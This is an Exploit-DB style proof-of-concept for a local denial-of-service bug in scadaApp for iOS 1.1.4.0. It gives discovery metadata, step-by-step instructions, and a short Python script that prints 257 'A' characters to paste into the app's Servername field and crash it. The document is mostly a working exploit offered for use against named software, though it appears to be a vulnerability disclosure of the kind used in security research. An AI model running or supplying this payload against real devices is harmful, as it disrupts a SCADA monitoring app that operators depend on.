# Exploit Title: scadaApp for iOS 1.1.4.0 - 'Servername' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2019-11-18
# Vendor Homepage: https://apps.apple.com/ca/app/scadaapp/id1206266634
# Software Link: App Store for iOS devices
# Tested Version: 1.1.4.0
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 7 iOS 13.2

# Steps to Produce the Crash:
# 1.- Run python code: scadaApp_for_iOS_1.1.4.0.py
# 2.- Copy content to clipboard
# 3.- Open "scadaApp for iOS"
# 4.- Let's go
# 5.- Username > "l4m5"
# 6.- Password > "l4m5"
# 7.- Paste ClipBoard on "Servername"
# 8.- Login
# 9.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 257
print (buffer)